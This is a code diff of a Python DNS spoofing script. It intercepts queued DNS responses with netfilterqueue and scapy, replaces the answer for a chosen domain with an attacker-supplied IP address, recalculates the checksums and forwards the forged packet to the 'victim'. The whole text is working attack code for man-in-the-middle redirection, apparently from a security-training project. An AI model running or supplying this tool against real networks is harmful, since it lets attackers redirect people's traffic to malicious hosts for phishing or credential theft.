@@ -1,34 +1,58 @@
-#! /usr/bin/env python
+#! /usr/bin/env python3
 
 import netfilterqueue
 import scapy.all as scapy
 import argparse
 
 
-parser = argparse.ArgumentParser()
-parser.add_argument("-o", "--original", dest="original_site", help="Specify a site to spoof")
-parser.add_argument("-r", "--redirect", dest="redirect_site", help="Specify a site to redirect to")
-options = parser.parse_args()
+def get_args():
+    parser = argparse.ArgumentParser()
+    parser.add_argument("-d", "--domain", dest="domain", help="Specify a domain to spoof")
+    parser.add_argument("-r", "--ip", dest="ip", help="Specify IP address to redirect to")
+    values = parser.parse_args()
+    if not values.domain:
+        parser.error("[-] Please specify a domain to spoof, use --help for more information")
+    if not values.ip:
+        parser.error("[-] Please specify IP address to redirect to, use --help for more information")
+    return values
+
+
+def forge_packet(scapy_packet):
+    options = get_args()
+    # Get the DNS Query name from the scapy packet.
+    # Query name is the host name sent by the victim to the DNS server.
+    qname = scapy_packet[scapy.DNSQR].qname
+    # If the query name is our target domain,
+    # modify the DNS sent IP address with IP address in arguments.
+    if options.domain+'.' == qname.decode():
+        print("[+] Spoofing Target")
+        answer = scapy.DNSRR(rrname=qname, rdata=options.ip)
+        scapy_packet[scapy.DNS].an = answer
+        # Modify the packet ancount with 1,
+        # as we are sent a single DNSRR to the victim.
+        scapy_packet[scapy.DNS].ancount = 1
+        # Packet corruption can be detected using the
+        # checksum and other information. By deleting them
+        # scapy generates new entries for them.
+        del scapy_packet[scapy.IP].len
+        del scapy_packet[scapy.IP].chksum
+        del scapy_packet[scapy.UDP].chksum
+        del scapy_packet[scapy.UDP].len
+    return scapy_packet
 
 
 def process_packet(packet):
+    # Convert the NetfilterQueue packet into a scapy packet.
     scapy_packet = scapy.IP(packet.get_payload())
-    # DNS Resource Record
+    # Check  in it
+    # If the scapy packet has the DNS Resource Record(DNSRR),
+    # modify the packet, otherwise no changes will be made.
     if scapy_packet.haslayer(scapy.DNSRR):
-        qname = scapy_packet[scapy.DNSQR].qname
-        if options.original_site+"." in qname:
-            print("[+] Spoofing Target")
-            answer = scapy.DNSRR(rrname=qname, rdata=options.redirect_site)
-            scapy_packet[scapy.DNS].an = answer
-            scapy_packet[scapy.DNS].ancount = 1
-            # Recalculate these (scapy)
-            del scapy_packet[scapy.IP].len
-            del scapy_packet[scapy.IP].chksum
-            del scapy_packet[scapy.UDP].chksum
-            del scapy_packet[scapy.UDP].len
-            # Set modified scapy_packet as payload in packet
-            packet.set_payload(str(scapy_packet))
-    # Forward
+        forged_packet = forge_packet(scapy_packet)
+        # Set the forged scapy packet payload to the
+        # NetfilterQueue packet.
+        packet.set_payload(bytes(forged_packet))
+    # Forward to the victim.
     packet.accept()
 
 
